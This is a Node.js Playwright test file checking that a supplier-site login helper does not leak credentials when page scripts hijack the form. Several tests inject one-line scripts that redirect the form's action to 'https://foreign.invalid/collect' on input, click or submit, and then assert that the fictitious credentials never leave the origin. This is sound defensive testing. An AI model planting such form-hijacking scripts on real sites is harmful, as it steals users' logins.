'use strict';
const {test}=require('node:test'),assert=require('node:assert/strict');
const {chromium}=require('playwright');
const fs=require('node:fs'),vm=require('node:vm');
const helper=require('../tecnoprices-login');
const apiFixture=require('./tecnoprices-api-fixture');
const ORIGIN='https://www.tecnoprices.com';
const loginForm=(action='/control.php',script='',submit='<button type="submit">Ingresar</button>')=>`<form method="post" action="${action}"><input name="usuario"><input type="password" name="password">${submit}</form><script>${script}</script>`;
const signedIn='<a href="/salir.php">Salir</a><h1>Ficticio</h1>';
test('independent Tecnoprices DOM mutation and session QA; all requests fulfilled locally',async t=>{
 const browser=await chromium.launch({headless:true,...(process.env.SV_TEST_CHROMIUM?{executablePath:process.env.SV_TEST_CHROMIUM}:{})});
 try{
  for(const [name,script]of [
   ['password input changes form action',`document.querySelector('[name=password]').addEventListener('input',()=>document.querySelector('form').action='https://foreign.invalid/collect')`],
   ['click changes submit formaction',`document.querySelector('button').addEventListener('click',e=>e.currentTarget.setAttribute('formaction','https://foreign.invalid/collect'))`],
   ['submit handler changes form action',`document.querySelector('form').addEventListener('submit',e=>e.currentTarget.action='https://foreign.invalid/collect')`]
  ])await t.test(name+' must not transmit credentials outside origin',async()=>{
   const context=apiFixture(await browser.newContext({serviceWorkers:'block'})),requests=[];
   try{
    await context.route('**/*',route=>{const request=route.request();requests.push({origin:new URL(request.url()).origin,method:request.method(),hasCredentials:request.postData()?.includes('usuario=qa-fiction-user')&&request.postData()?.includes('password=qa-fiction-password')});return route.fulfill({contentType:'text/html',body:new URL(request.url()).pathname==='/ingresar'?loginForm('/control.php',script):signedIn});});
    const page=await context.newPage();await page.goto(ORIGIN+'/ingresar');let failure;try{await helper.login(page,'qa-fiction-user','qa-fiction-password');}catch(error){failure=error;}
    const leaked=requests.filter(request=>request.origin!==ORIGIN&&request.hasCredentials);
    assert.equal(leaked.length,0,'A fully intercepted foreign-origin request contained both fictitious credentials');
    assert.equal(failure,undefined);
   }finally{await context.close();}
  });
  for(const [name,action,submit]of [
   ['URL normalizes host and HTTPS default port','https://WWW.TECNOPRICES.COM:443/control.php','<input type="submit" value="Ingresar">'],
   ['URL resolves dot segments','/form/../control.php','<input type="submit" value="Ingresar">']
  ])await t.test(name+' remains a legitimate login',async()=>{
   const context=apiFixture(await browser.newContext({serviceWorkers:'block'}));let posted=0;
   try{await context.route('**/*',route=>{const req=route.request();assert.equal(new URL(req.url()).origin,ORIGIN);if(req.method()==='POST'){posted++;assert.equal(new URL(req.url()).pathname,'/control.php');}return route.fulfill({contentType:'text/html',body:new URL(req.url()).pathname==='/ingresar'?loginForm(action,'',submit):signedIn});});const page=await context.newPage();await page.goto(ORIGIN+'/ingresar');await helper.login(page,'qa-fiction-user','qa-fiction-password');assert.equal(posted,1);}finally{await context.close();}
  });
  await t.test('scraper completes with credentials absent from DOM despite submit mutation',async()=>{
   const context=apiFixture(await browser.newContext({serviceWorkers:'block'})),sessions=new Map();let leaked=0,extracted=0;
   try{
    await context.route('**/*',route=>{const req=route.request();if(new URL(req.url()).origin!==ORIGIN&&req.postData()?.includes('password=qa-fiction-password'))leaked++;return route.fulfill({contentType:'text/html',body:new URL(req.url()).pathname==='/ingresar'?loginForm('/control.php',`document.querySelector('form').addEventListener('submit',e=>e.currentTarget.action='https://foreign.invalid/collect')`):signedIn});});
    const source=fs.readFileSync(require.resolve('../index.js'),'utf8'),scraper=source.slice(source.indexOf('function firmaCredencialesProveedor('),source.indexOf('\nasync function cotizarBiosegur('));
    const scope={require:()=>helper,crypto:require('node:crypto'),sesionesProveedorManual:sessions,SESION_PROVEEDOR_TTL_MS:900000,claveSesionProveedorManual:()=> 'qa-fiction',normalizarUrl:v=>v,adquirirNavegador:async()=>({newContext:async()=>context,close:async()=>{}}),extraerPrecioPaginaProveedor:async()=>{extracted++;return{precioArs:1234};},extraerDisponibilidadPaginaProveedor:async()=> 'disponible',extraerCondicionIva:()=>({}),tituloVisibleProducto:async()=> 'Ficticio',identidadAlta:()=>({ok:true}),validarIdentidadProducto:()=>({ok:true}),Date,Map,URL};vm.runInNewContext(scraper,scope);
    const result=await scope.cotizarProveedorConLogin({proveedor:{usuario:'qa-fiction-user',password:'qa-fiction-password'},proveedorKey:'qa-fiction',url:ORIGIN+'/producto-exacto',tipo:'tecnoprices'});
    assert.equal(result.precioArs,1234);assert.equal(extracted,1);assert.equal(sessions.size,1);assert.equal(leaked,0);
   }finally{await context.close();}
  });
  for(const href of ['/logout.php','/cerrar_sesion.php','/cerrar-sesion/','https://WWW.TECNOPRICES.COM:443/salir.php'])await t.test('session accepts same-origin logout path '+href,async()=>{
   const context=await browser.newContext({serviceWorkers:'block'});
   try{await context.route('**/*',route=>route.fulfill({contentType:'text/html',body:`<a href="${href}"><span aria-label="salir">↪</span></a><b>$ 1234 ficticios</b>`}));const page=await context.newPage();await page.goto(ORIGIN+'/producto-exacto');await helper.assertSession(page);}finally{await context.close();}
  });
  await t.test('navigation to foreign session page refuses even with a matching logout label',async()=>{
   const context=await browser.newContext({serviceWorkers:'block'});
   try{await context.route('**/*',route=>route.fulfill({contentType:'text/html',body:signedIn}));const page=await context.newPage();await page.goto('https://foreign.invalid/cuenta');await assert.rejects(helper.assertSession(page),{code:'TECNOPRICES_SESSION_REQUIRED'});}finally{await context.close();}
  });
 }finally{await browser.close();}
});
